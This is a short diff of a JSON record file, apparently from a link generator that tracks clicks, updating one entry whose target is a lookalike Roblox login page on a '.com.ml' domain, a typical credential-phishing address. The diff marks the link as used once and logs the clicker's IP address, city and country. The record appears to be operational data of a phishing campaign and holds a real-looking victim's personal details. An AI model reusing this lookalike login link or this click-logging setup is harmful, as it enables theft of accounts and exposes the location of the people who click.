@@ -14408,8 +14408,17 @@
     "targetUrl": "https://www.roblox.com.ml/login",
     "createdAt": 1778940915640,
     "status": "active",
-    "useCount": 0,
+    "useCount": 1,
     "createdBy": "generator",
-    "clicks": []
+    "clicks": [
+      {
+        "timestamp": 1778940919346,
+        "ip": "143.44.185.136",
+        "country": "Philippines",
+        "city": "Davao City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      }
+    ]
   }
 ]
